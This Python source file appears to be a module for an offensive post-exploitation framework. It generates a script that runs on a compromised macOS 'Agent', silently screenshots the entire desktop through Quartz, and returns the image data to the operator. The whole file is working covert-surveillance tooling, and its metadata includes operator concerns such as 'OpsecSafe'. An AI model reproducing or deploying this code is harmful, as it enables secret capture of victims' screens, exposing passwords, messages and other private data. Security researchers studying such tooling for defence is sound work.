from zlib_wrapper import compress
import os
from lib.common import helpers
import hashlib
import base64
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'NativeScreenshot',
            'Author': ['@xorrior'],
            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
            'Background': False,
            'OutputExtension': "png",
            'NeedsAdmin': False,
            'OpsecSafe': False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': []
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
try:
    import Quartz
    import Quartz.CoreGraphics as CG
    from AppKit import *
    import binascii
except ImportError:
    print "Missing required module..."
onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
props = NSDictionary()
imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
hexstring = binascii.hexlify(imageString)
hex_data = hexstring.decode('hex')
print hex_data
"""
        return script